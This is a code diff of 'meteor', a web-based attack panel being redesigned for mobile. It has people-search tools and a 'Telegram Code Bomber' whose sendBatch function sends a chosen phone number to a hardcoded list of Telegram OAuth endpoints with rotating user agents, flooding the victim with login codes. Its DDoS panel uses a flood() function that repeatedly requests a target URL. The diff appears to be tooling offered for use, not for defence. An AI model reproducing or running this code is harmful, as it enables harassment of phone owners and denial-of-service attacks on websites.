+  pointer-events:none;
+}
+.toast{
+  pointer-events:auto;position:relative;
+  padding:14px 16px;
+  border-radius:var(--radius-sm);
+  background:var(--bg-elevated);
+  border:1px solid var(--border);
+  box-shadow:0 12px 40px rgba(0,0,0,0.55);
+  display:flex;gap:12px;align-items:flex-start;
+  animation:toastIn .4s var(--ease-bounce);
+  overflow:hidden;
+}
+@keyframes toastIn{from{opacity:0;transform:translateY(-20px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}
+.toast.out{animation:toastOut .3s ease forwards}
+@keyframes toastOut{to{opacity:0;transform:translateY(-20px) scale(.95)}}
+
+.toast .ico{
+  width:28px;height:28px;border-radius:8px;flex-shrink:0;
+  display:grid;place-items:center;color:#fff;
+  background:linear-gradient(135deg,var(--green),#0ea848);
+}
+.toast.warn .ico{background:linear-gradient(135deg,var(--yellow),#d48f00)}
+.toast.err .ico{background:linear-gradient(135deg,var(--red),#c43d12)}
+.toast.info .ico{background:linear-gradient(135deg,var(--accent),#5b5cf0)}
+.toast .ico svg{width:15px;height:15px;stroke:#fff;stroke-width:2.6;fill:none;stroke-linecap:round;stroke-linejoin:round}
+
+.toast .body{flex:1;min-width:0}
+.toast .body b{display:block;font-size:14px;font-weight:600;margin-bottom:2px}
+.toast .body p{font-size:12.5px;color:var(--text-soft);line-height:1.4}
+
+.toast .progress-line{
+  position:absolute;left:0;right:0;bottom:0;height:2px;
+  background:rgba(255,255,255,0.06);
+}
+.toast .progress-line i{
+  display:block;height:100%;background:var(--accent);
+  transform-origin:left;transform:scaleX(1);
+  animation:prog linear forwards;
+}
+@keyframes prog{to{transform:scaleX(0)}}
+
+/* ---------- FAB (Floating Action Button) ---------- */
+.fab{
+  position:fixed;
+  right:calc(16px + var(--safe-right));
+  bottom:calc(80px + var(--safe-bottom));
+  z-index:100;
+  width:56px;height:56px;border-radius:50%;
+  background:linear-gradient(135deg,var(--accent),#5b5cf0);
+  color:#fff;
+  display:grid;place-items:center;
+  box-shadow:0 8px 24px var(--accent-glow),0 4px 12px rgba(0,0,0,0.4);
+  transition:transform .2s var(--ease-bounce);
+  border:none;
+}
+.fab:active{transform:scale(.9)}
+.fab svg{width:24px;height:24px;stroke:currentColor;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+
+/* ---------- GRIDS ---------- */
+.grid-2{display:grid;grid-template-columns:1fr;gap:12px}
+.flex{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.flex-col{display:flex;flex-direction:column;gap:10px}
+.mb10{margin-bottom:10px}.mb14{margin-bottom:14px}.mb18{margin-bottom:18px}
+.mt10{margin-top:10px}.mt14{margin-top:14px}
+
+/* ---------- SWIPE HINT ---------- */
+.swipe-hint{
+  text-align:center;font-size:10.5px;color:var(--text-dim);
+  padding:8px 0;
+}
+
+/* ---------- MODAL — bottom sheet ---------- */
+.modal-overlay{
+  position:fixed;inset:0;z-index:2000;
+  background:rgba(0,0,0,0.65);
+  backdrop-filter:blur(8px);
+  -webkit-backdrop-filter:blur(8px);
+  display:none;
+  align-items:flex-end;
+  animation:fadeIn .25s ease;
+}
+.modal-overlay.active{display:flex}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.modal-sheet{
+  width:100%;
+  background:var(--bg-card);
+  border-radius:24px 24px 0 0;
+  padding:12px 18px calc(20px + var(--safe-bottom));
+  max-height:85vh;
+  overflow-y:auto;
+  animation:sheetUp .3s var(--ease);
+  border-top:1px solid var(--border);
+  box-shadow:0 -20px 60px rgba(0,0,0,0.55);
+}
+@keyframes sheetUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.sheet-handle{
+  width:40px;height:4px;border-radius:4px;
+  background:var(--text-dim);opacity:.4;
+  margin:0 auto 16px;
+}
+.sheet-title{
+  font-size:18px;font-weight:700;
+  margin-bottom:12px;padding-bottom:12px;
+  border-bottom:1px solid var(--border);
+}
+.sheet-content{
+  font-family:ui-monospace,Menlo,Consolas,monospace;
+  font-size:13px;white-space:pre-wrap;line-height:1.7;
+  color:var(--text-soft);
+  margin-bottom:16px;
+}
+
+/* ---------- ACTIVE STATE ---------- */
+.active-indicator{
+  display:inline-flex;align-items:center;gap:6px;
+  padding:4px 10px;border-radius:99px;
+  font-size:11px;font-weight:600;
+  background:rgba(16,197,80,0.15);color:#7ef0a8;
+  border:1px solid rgba(16,197,80,0.3);
+}
+.active-indicator .pulse{
+  width:6px;height:6px;border-radius:50%;background:var(--green);
+  animation:pulse 1.5s ease-in-out infinite;
+}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.3)}}
+
+/* ---------- SMALL SCREENS ---------- */
+@media (max-width:380px){
+  .app-header{padding:10px 12px}
+  .app-content{padding:14px 12px 16px}
+  .stat-card .val{font-size:20px}
+  .panel-head h1{font-size:20px}
+  .gbtn{padding:12px 16px;font-size:13px}
+  .section-header{padding:12px 14px}
+  .section-body{padding:2px 14px 12px}
+}
+
+/* ---------- LANDSCAPE ---------- */
+@media (max-height:500px) and (orientation:landscape){
+  .app-header{padding:8px 14px;min-height:auto}
+  .app-logo{width:28px;height:28px}
+  .app-title b{font-size:13px}
+  .bottom-nav{padding:4px 4px calc(4px + var(--safe-bottom))}
+  .nav-item{min-height:44px;padding:4px}
+  .nav-item svg{width:18px;height:18px}
+  .nav-item span{font-size:9px}
+}
+
+/* ---------- TABLET ---------- */
+@media (min-width:768px){
+  .app-content{padding:20px 24px 24px}
+  .stat-grid{grid-template-columns:repeat(4,1fr);gap:14px}
+  .grid-2{grid-template-columns:1fr 1fr;gap:16px}
+  .toasts{left:auto;right:20px;max-width:380px}
+}
+</style>
 </head>
-<body>
+<body data-theme="dark">
 
-    <div class="bg-glow"></div>
-    <div class="bg-glow"></div>
-    <div id="particles"></div>
+<div class="bg">
+  <div class="bg-glow a"></div>
+  <div class="bg-glow b"></div>
+</div>
 
-    <header class="header">
-        <div class="brand">meteor<span>.</span></div>
-        <!-- subtitle удалён -->
-    </header>
-
-    <nav class="nav-center" id="mainNav">
-        <button class="nav-btn active" data-page="home"><i>⌂</i> Home</button>
-        <button class="nav-btn" data-page="search"><i>◈</i> Search</button>
-        <button class="nav-btn" data-page="domain"><i>⊹</i> Domain</button>
-        <button class="nav-btn" data-page="spam"><i>⚡</i> Spam</button>
-        <button class="nav-btn" data-page="settings"><i>⚙</i> Settings</button>
-        <button class="nav-btn" data-page="logs"><i>≡</i> Logs</button>
-    </nav>
-
-    <main class="main">
-
-        <section id="page-home" class="page active">
-            <div class="stats-grid">
-                <div class="stat-box"><div class="stat-num" id="reqTotal">0</div><div class="stat-label">Requests</div></div>
-                <div class="stat-box"><div class="stat-num" id="uptime">00:00:00</div><div class="stat-label">Uptime</div></div>
-                <div class="stat-box"><div class="stat-num" id="successRate">100%</div><div class="stat-label">Success</div></div>
-                <div class="stat-box"><div class="stat-num" id="statusLed">🟢</div><div class="stat-label">Status</div></div>
-            </div>
-            <div class="card">
-                <div class="card-title">System</div>
-                <div class="progress-bar"><div class="progress-fill" id="coreFill" style="width:86%"></div></div>
-            </div>
-            <div class="card">
-                <div class="card-title">Recent Activity</div>
-                <div class="log-area" id="recentLog" style="max-height:150px;"></div>
-            </div>
-        </section>
-
-        <section id="page-search" class="page">
-            <div class="grid-2">
-                <div class="card">
-                    <div class="card-title">👤 Username (25+ sites)</div>
-                    <div class="input-group"><input type="text" id="searchUsername" placeholder="@username"></div>
-                    <button class="btn btn-success" id="searchUsernameBtn">▶ Search</button>
-                    <div class="log-area" id="searchUsernameLog" style="max-height:120px;"></div>
-                </div>
-                <div class="card">
-                    <div class="card-title">📧 Email (40+ sites)</div>
-                    <div class="input-group"><input type="email" id="searchEmail" placeholder="user@example.com"></div>
-                    <button class="btn btn-success" id="searchEmailBtn">▶ Search</button>
-                    <div class="log-area" id="searchEmailLog" style="max-height:120px;"></div>
-                </div>
-                <div class="card">
-                    <div class="card-title">📱 Phone Number</div>
-                    <div class="input-group"><input type="text" id="searchPhone" placeholder="+7 999 123 45 67"></div>
-                    <button class="btn btn-success" id="searchPhoneBtn">▶ Search</button>
-                    <div class="log-area" id="searchPhoneLog" style="max-height:120px;"></div>
-                </div>
-                <div class="card">
-                    <div class="card-title">🌐 IP Address</div>
-                    <div class="input-group"><input type="text" id="searchIp" placeholder="8.8.8.8"></div>
-                    <button class="btn btn-success" id="searchIpBtn">▶ Search</button>
-                    <div class="log-area" id="searchIpLog" style="max-height:120px;"></div>
-                </div>
-            </div>
-        </section>
-
-        <section id="page-domain" class="page">
-            <div class="grid-2">
-                <div class="card">
-                    <div class="card-title">🌐 Domain Recon (theHarvester)</div>
-                    <div class="input-group"><input type="text" id="domainTarget" placeholder="example.com"></div>
-                    <button class="btn btn-success" id="domainHarvestBtn">▶ Harvest</button>
-                    <div class="log-area" id="domainLog" style="max-height:150px;"></div>
-                </div>
-                <div class="card">
-                    <div class="card-title">🔍 Subdomain Discovery (Subfinder)</div>
-                    <div class="input-group"><input type="text" id="subfinderTarget" placeholder="example.com"></div>
-                    <button class="btn btn-success" id="subfinderBtn">▶ Find Subdomains</button>
-                    <div class="log-area" id="subfinderLog" style="max-height:150px;"></div>
-                </div>
-            </div>
-        </section>
-
-        <section id="page-spam" class="page">
-            <div class="card">
-                <div class="card-title">⚡ Telegram Code Bomber</div>
-                <div class="input-group"><label>📞 Phone (with +)</label><input type="tel" id="smsPhone" value="+7"></div>
-                <div class="input-group"><label>🔄 Cycles (1 cycle = 5 requests)</label><input type="number" id="smsCycles" value="3" min="1" max="30"></div>
-                <button class="btn" id="smsBtn">▶ Launch</button>
-                <div class="log-area" id="smsLog"></div>
-            </div>
-            <div class="card">
-                <div class="card-title">🌐 DDoS Attack</div>
-                <div class="input-group"><label>🎯 Target URL</label><input type="text" id="ddosUrl" placeholder="https://example.com"></div>
-                <div class="input-group"><label>⚡ Threads (1-200)</label><input type="number" id="ddosThreads" value="60" min="1" max="200"></div>
-                <div class="input-group"><label>⏱️ Duration (sec)</label><input type="number" id="ddosDuration" value="30" min="5" max="300"></div>
-                <button class="btn btn-danger" id="ddosBtn">▶ Launch</button>
-                <div class="progress-bar" id="ddosProgress" style="display:none; margin-top:12px;">
-                    <div class="progress-fill" id="ddosFill"></div>
-                </div>
-                <div class="log-area" id="ddosLog"></div>
-            </div>
-        </section>
-
-        <section id="page-settings" class="page">
-            <div class="settings-grid">
-                <div class="card">
-                    <div class="card-title">Appearance</div>
-                    <div class="input-group">
-                        <label>🎨 Theme</label>
-                        <div class="theme-group">
-                            <div class="theme-btn active" data-theme="dark">🌙 Dark</div>
-                            <div class="theme-btn" data-theme="light">☀️ Light</div>
-                        </div>
-                    </div>
-                    <div class="input-group">
-                        <label>🔤 Font</label>
-                        <select id="fontSelect">
-                            <option>Inter</option>
-                            <option>Fira Code</option>
-                            <option>JetBrains Mono</option>
-                            <option>Consolas</option>
-                        </select>
-                    </div>
-                    <div class="input-group">
-                        <label>🔊 Sound effects</label>
-                        <select id="soundSelect">
-                            <option value="on">On</option>
-                            <option value="off">Off</option>
-                        </select>
-                    </div>
-                    <div class="input-group">
-                        <label>🎨 Particles count</label>
-                        <input type="range" id="particleRange" min="0" max="80" value="40">
-                        <span id="particleCountDisplay">40</span>
-                    </div>
-                    <div class="setting-toggle">
-                        <span style="color:var(--text-dim); font-size:0.8rem;">⚡ Eco mode</span>
-                        <div class="toggle" id="ecoToggle"></div>
-                    </div>
-                </div>
-                <div class="card">
-                    <div class="card-title">System</div>
-                    <div class="input-group">
-                        <label>🔄 Restart App</label>
-                        <button class="btn" id="restartBtn">⟳ Restart</button>
-                    </div>
-                    <div class="input-group">
-                        <label>🗑️ Reset all settings</label>
-                        <button class="btn btn-danger" id="resetBtn">⟲ Reset</button>
-                    </div>
-                    <div class="input-group">
-                        <label>👤 Developer</label>
-                        <button class="btn" id="devContactBtn">✉️ Перейти к ЛС разработчика</button>
-                    </div>
-                </div>
-                <div class="card">
-                    <div class="card-title">Limits</div>
-                    <div class="input-group">
-                        <label>💣 Spam Kod (daily)</label>
-                        <span id="spamLimitDisplay">5 / 5</span>
-                    </div>
-                    <div class="input-group">
-                        <label>🌐 DDoS Attack (daily)</label>
-                        <span id="ddosLimitDisplay">3 / 3</span>
-                    </div>
-                    <div class="input-group">
-                        <label>📊 Search (daily)</label>
-                        <span id="searchLimitDisplay">10 / 10</span>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section id="page-logs" class="page">
-            <div class="card">
-                <div class="log-area" id="globalLog" style="max-height:400px;"></div>
-                <div style="display:flex; gap:12px; margin-top:16px;">
-                    <button class="btn" id="clearLogs" style="background:var(--bg-input);">✕ Clear</button>
-                    <button class="btn" id="copyLogs" style="background:var(--bg-input);">⎘ Copy</button>
-                </div>
-            </div>
-        </section>
-
-    </main>
-
-    <div class="report-modal" id="reportModal">
-        <div class="report-card">
-            <h2 id="reportTitle">📄 Report</h2>
-            <div class="report-data" id="reportContent"></div>
-            <div class="report-actions">
-                <button id="downloadReportBtn">⬇ Download .txt</button>
-                <button id="copyReportBtn">⎘ Copy</button>
-                <button class="close-report" id="closeReportBtn">✕ Close</button>
-            </div>
-        </div>
+<div class="app">
+  <!-- HEADER -->
+  <header class="app-header">
+    <div class="app-logo">⚡</div>
+    <div class="app-title">
+      <b>meteor</b>
+      <span><i class="dot-online"></i>Online · v3.0 Mobile</span>
     </div>
+    <div class="header-stats">
+      <div class="stat"><b id="topReq">0</b>REQ</div>
+      <div class="stat"><b id="topUp">00:00</b>UP</div>
+    </div>
+  </header>
 
-    <footer class="footer">✦ meteor v3.0</footer>
+  <!-- CONTENT -->
+  <main class="app-content" id="content"></main>
 
-    <script>
-        // ============================================================
-        //  DATA & STATE
-        // ============================================================
-        let total = 0,
-            success = 0;
-        let start = Date.now();
-        let sound = true;
-        let ddosActive = false;
-        let lastReportData = '';
-        let ecoMode = false;
+  <!-- BOTTOM NAV -->
+  <nav class="bottom-nav" id="bottomNav"></nav>
+</div>
 
-        // ============================================================
-        //  LIMITS SYSTEM (localStorage)
-        // ============================================================
-        const LIMITS = {
-            spam: { daily: 5, key: 'spamUsed' },
-            ddos: { daily: 3, key: 'ddosUsed' },
-            search: { daily: 10, key: 'searchUsed' }
-        };
+<!-- TOASTS -->
+<div class="toasts" id="toasts"></div>
 
-        function getToday() {
-            return new Date().toISOString().split('T')[0];
-        }
+<!-- FAB -->
+<button class="fab" id="fabStop" title="Emergency Stop" style="display:none">
+  <svg viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>
+</button>
 
-        function getLimitUsage(type) {
-            const key = LIMITS[type].key;
-            const data = JSON.parse(localStorage.getItem(key) || '{}');
-            const today = getToday();
-            if (data.date !== today) {
-                return { used: 0, date: today };
-            }
-            return { used: data.used || 0, date: today };
-        }
+<!-- MODAL (bottom sheet) -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal-sheet">
+    <div class="sheet-handle"></div>
+    <div class="sheet-title" id="modalTitle">Info</div>
+    <div class="sheet-content" id="modalContent"></div>
+    <div class="flex-col">
+      <button class="gbtn primary block" id="modalOk">OK</button>
+      <button class="gbtn ghost block" id="modalCancel">Отмена</button>
+    </div>
+  </div>
+</div>
 
-        function updateLimitUsage(type, increment = 1) {
-            const key = LIMITS[type].key;
-            const current = getLimitUsage(type);
-            const newUsed = current.used + increment;
-            localStorage.setItem(key, JSON.stringify({ date: current.date, used: newUsed }));
-            return newUsed;
-        }
+<script>
+(function(){
+'use strict';
 
-        function getRemaining(type) {
-            const usage = getLimitUsage(type);
-            const daily = LIMITS[type].daily;
-            return Math.max(0, daily - usage.used);
-        }
+/* ---------- SVG ICONS ---------- */
+function svgI(inner){ return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">'+inner+'</svg>'; }
+var ICONS = {
+  dashboard: svgI('<rect x="3" y="3" width="7.5" height="7.5" rx="2"/><rect x="13.5" y="3" width="7.5" height="7.5" rx="2"/><rect x="3" y="13.5" width="7.5" height="7.5" rx="2"/><rect x="13.5" y="13.5" width="7.5" height="7.5" rx="2"/>'),
+  spam:      svgI('<polygon points="13 2 4 14 11 14 10 22 20 10 13 10 13 2"/>'),
+  logs:      svgI('<line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/>'),
+  settings:  svgI('<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 00.3 1.9l.1.1a2 2 0 11-2.8 2.8l-.1-.1a1.7 1.7 0 00-1.9-.3 1.7 1.7 0 00-1 1.5V21a2 2 0 11-4 0v-.1a1.7 1.7 0 00-1-1.5 1.7 1.7 0 00-1.9.3l-.1.1A2 2 0 114.2 17l.1-.1a1.7 1.7 0 00.3-1.9 1.7 1.7 0 00-1.5-1H3a2 2 0 110-4h.1a1.7 1.7 0 001.5-1 1.7 1.7 0 00-.3-1.9l-.1-.1A2 2 0 117 4.2l.1.1a1.7 1.7 0 001.9.3H9a1.7 1.7 0 001-1.5V3a2 2 0 114 0v.1a1.7 1.7 0 001 1.5 1.7 1.7 0 001.9-.3l.1-.1A2 2 0 1119.8 7l-.1.1a1.7 1.7 0 00-.3 1.9V9a1.7 1.7 0 001.5 1H21a2 2 0 110 4h-.1a1.7 1.7 0 00-1.5 1z"/>'),
+  check:     svgI('<polyline points="20 6 9 17 4 12"/>'),
+  info:      svgI('<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>'),
+  alert:     svgI('<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>'),
+  zap:       svgI('<polygon points="13 2 4 14 11 14 10 22 20 10 13 10 13 2"/>'),
+  trash:     svgI('<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6"/><path d="M10 11v6M14 11v6"/>'),
+  copy:      svgI('<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>'),
+  refresh:   svgI('<polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.5 9a9 9 0 0114.9-3.4L23 10M1 14l4.6 4.4A9 9 0 0020.5 15"/>'),
+  chevron:   svgI('<polyline points="6 9 12 15 18 9"/>'),
+  plus:      svgI('<line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>'),
+  stop:      svgI('<rect x="6" y="6" width="12" height="12" rx="2"/>')
+};
 
-        function checkLimit(type) {
-            return getRemaining(type) > 0;
-        }
+/* ---------- STATE ---------- */
+var total = 0, success = 0, startTime = Date.now();
+var smsRunning = false, ddosActive = false;
 
-        function updateLimitDisplays() {
-            document.getElementById('spamLimitDisplay').textContent =
-                `${getRemaining('spam')} / ${LIMITS.spam.daily}`;
-            document.getElementById('ddosLimitDisplay').textContent =
-                `${getRemaining('ddos')} / ${LIMITS.ddos.daily}`;
-            document.getElementById('searchLimitDisplay').textContent =
-                `${getRemaining('search')} / ${LIMITS.search.daily}`;
-        }
+/* ---------- TOASTS ---------- */
+function toast(title, message, kind, duration){
+  kind = kind || 'ok';
+  duration = duration || 3200;
+  var container = document.getElementById('toasts');
+  if(!container) return;
+  var el = document.createElement('div');
+  el.className = 'toast ' + kind;
+  var ico = kind==='ok'?ICONS.check:(kind==='info'?ICONS.info:ICONS.alert);
+  el.innerHTML = '<div class="ico">'+ico+'</div><div class="body"><b></b><p></p></div>'+
+    '<div class="progress-line"><i style="animation-duration:'+duration+'ms"></i></div>';
+  el.querySelector('b').textContent = title;
+  el.querySelector('p').textContent = message || '';
+  container.appendChild(el);
+  var t = setTimeout(function(){
+    el.classList.add('out');
+    setTimeout(function(){ if(el.parentNode) el.parentNode.removeChild(el); }, 300);
+  }, duration);
+  el.addEventListener('click', function(){ clearTimeout(t); el.classList.add('out'); setTimeout(function(){ if(el.parentNode) el.parentNode.removeChild(el); }, 300); });
+}
 
-        // ============================================================
-        //  LOGGING
-        // ============================================================
-        function log(msg, type = 'info', target = null) {
-            const line = `<div class="log-line log-${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            if (target) {
-                target.insertAdjacentHTML('beforeend', line);
-                target.scrollTop = target.scrollHeight;
-            }
-            const global = document.getElementById('globalLog');
-            if (global) {
-                global.insertAdjacentHTML('beforeend', line);
-                global.scrollTop = global.scrollHeight;
-            }
-            const recent = document.getElementById('recentLog');
-            if (recent) {
-                recent.insertAdjacentHTML('beforeend', line);
-                if (recent.children.length > 15) recent.removeChild(recent.children[0]);
-                recent.scrollTop = recent.scrollHeight;
-            }
-        }
+/* ---------- HAPTIC FEEDBACK ---------- */
+function haptic(ms){
+  if(navigator.vibrate) navigator.vibrate(ms || 10);
+}
 
-        function beep() {
-            if (sound) {
-                try { new Audio('data:audio/wav;base64,U3RlYWx0aCBzb3VuZA==').play().catch(() => {}); } catch (e) {}
-            }
-        }
+/* ---------- LOGGING ---------- */
+function log(msg, type, target){
+  type = type || 'info';
+  var line = '<div class="log-line log-'+type+'">['+new Date().toLocaleTimeString()+'] '+msg+'</div>';
+  if(target){ target.insertAdjacentHTML('beforeend', line); target.scrollTop = target.scrollHeight; }
+  var global = document.getElementById('globalLog');
+  if(global){ global.insertAdjacentHTML('beforeend', line); global.scrollTop = global.scrollHeight; }
+  var recent = document.getElementById('recentLog');
+  if(recent){
+    recent.insertAdjacentHTML('beforeend', line);
+    if(recent.children.length > 20) recent.removeChild(recent.children[0]);
+    recent.scrollTop = recent.scrollHeight;
+  }
+}
 
-        // ============================================================
-        //  STATS
-        // ============================================================
-        function updateStats() {
-            document.getElementById('reqTotal').innerText = total;
-            let sec = Math.floor((Date.now() - start) / 1000);
-            let h = String(Math.floor(sec / 3600)).padStart(2, '0');
-            let m = String(Math.floor((sec % 3600) / 60)).padStart(2, '0');
-            let s = String(sec % 60).padStart(2, '0');
-            document.getElementById('uptime').innerText = `${h}:${m}:${s}`;
-            let rate = total === 0 ? 100 : Math.floor((success / total) * 100);
-            document.getElementById('successRate').innerText = rate + '%';
-        }
-        setInterval(updateStats, 1000);
+/* ---------- STATS ---------- */
+function updateStats(){
+  var sec = Math.floor((Date.now()-startTime)/1000);
+  var h = String(Math.floor(sec/3600)).padStart(2,'0');
+  var m = String(Math.floor((sec%3600)/60)).padStart(2,'0');
+  var s = String(sec%60).padStart(2,'0');
+  var upShort = h+':'+m;
+  var up = h+':'+m+':'+s;
+  var setT = function(id,v){ var e=document.getElementById(id); if(e) e.textContent=v; };
+  setT('topReq', total);
+  setT('topUp', upShort);
+  setT('reqTotal', total);
+  setT('uptime', up);
+  setT('successRate', (total===0?100:Math.floor(success/total*100))+'%');
+}
+setInterval(updateStats, 1000);
 
-        // ============================================================
-        //  REPORT
-        // ============================================================
-        function showReport(title, content) {
-            document.getElementById('reportTitle').textContent = title;
-            document.getElementById('reportContent').textContent = content;
-            lastReportData = content;
-            document.getElementById('reportModal').classList.add('active');
-        }
+/* ---------- MODAL HELPERS ---------- */
+function showModal(title, content, onOk){
+  document.getElementById('modalTitle').textContent = title;
+  document.getElementById('modalContent').textContent = content;
+  document.getElementById('modalOverlay').classList.add('active');
+  var okBtn = document.getElementById('modalOk');
+  var cancelBtn = document.getElementById('modalCancel');
+  var newOk = okBtn.cloneNode(true);
+  var newCancel = cancelBtn.cloneNode(true);
+  okBtn.parentNode.replaceChild(newOk, okBtn);
+  cancelBtn.parentNode.replaceChild(newCancel, cancelBtn);
+  newOk.onclick = function(){
+    closeModal();
+    if(onOk) onOk();
+  };
+  newCancel.onclick = closeModal;
+  document.getElementById('modalOverlay').onclick = function(e){
+    if(e.target === this) closeModal();
+  };
+}
+function closeModal(){ document.getElementById('modalOverlay').classList.remove('active'); }
 
-        function closeReport() {
-            document.getElementById('reportModal').classList.remove('active');
-        }
+/* ---------- TELEGRAM ENDPOINTS ---------- */
+var endpoints = [
+  'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
+  'https://translations.telegram.org/auth/request',
+  'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
+  'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
+  'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+  'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+  'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
+  'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
+  'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
+  'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
+  'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
+  'https://my.telegram.org/auth/send_password',
+  'https://oauth.telegram.org/auth/request?bot_id=1285642618&origin=https%3A%2F%2Ftgstat.ru&embed=1&return_to=https%3A%2F%2Ftgstat.ru%2F',
+  'https://oauth.telegram.org/auth/request?bot_id=1703276856&origin=https%3A%2F%2Ftelemetr.io&embed=1&return_to=https%3A%2F%2Ftelemetr.io%2F',
+  'https://oauth.telegram.org/auth/request?bot_id=5375847339&origin=https%3A%2F%2Ftelegramchannels.me&embed=1&return_to=https%3A%2F%2Ftelegramchannels.me%2F'
+];
 
-        function downloadReport() {
-            if (!lastReportData) return;
-            const blob = new Blob([lastReportData], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `meteor_report_${Date.now()}.txt`;
-            a.click();
-            URL.revokeObjectURL(url);
-        }
+function randUA(){
+  var arr = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+  ];
+  return arr[Math.floor(Math.random()*arr.length)];
+}
+function rand(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
 
-        function copyReport() {
-            if (!lastReportData) return;
-            navigator.clipboard.writeText(lastReportData).then(() => {
-                log('📋 report copied', 'success');
-            }).catch(() => {
-                const ta = document.createElement('textarea');
-                ta.value = lastReportData;
-                document.body.appendChild(ta);
-                ta.select();
-                document.execCommand('copy');
-                ta.remove();
-                log('📋 report copied (fallback)', 'success');
-            });
-        }
+async function sendBatch(phone){
+  var shuffled = endpoints.slice();
+  for(var i=shuffled.length-1;i>0;i--){
+    var j = Math.floor(Math.random()*(i+1));
+    var t = shuffled[i]; shuffled[i]=shuffled[j]; shuffled[j]=t;
+  }
+  var count = Math.min(shuffled.length, rand(4,8));
+  var ok = 0;
+  for(var k=0;k<count;k++){
+    try{
+      await fetch(shuffled[k], {
+        method:'POST',
+        headers:{
+          'User-Agent':randUA(),
+          'Content-Type':'application/x-www-form-urlencoded',
+          'Accept':'*/*',
+          'Accept-Language':'en-US,en;q=0.9,ru;q=0.8'
+        },
+        body:'phone='+encodeURIComponent(phone),
+        mode:'no-cors'
+      });
+      ok++; total++; success++;
+    }catch(e){ total++; }
+    await new Promise(function(r){ setTimeout(r, rand(80,250)); });
+  }
+  return ok;
+}
 
-        // ============================================================
-        //  SEARCH FUNCTIONS
-        // ============================================================
+async function flood(url){
+  if(!ddosActive) return;
+  try{
+    await fetch(url, { mode:'no-cors', cache:'no-store' });
+    total++; success++;
+  }catch(e){ total++; }
+}
 
-        async function searchUsername(username) {
-            const clean = username.replace('@', '').trim();
-            if (!clean) return { error: 'empty username' };
-            const platforms = [
-                { name: 'Telegram', url: `https://t.me/${clean}` },
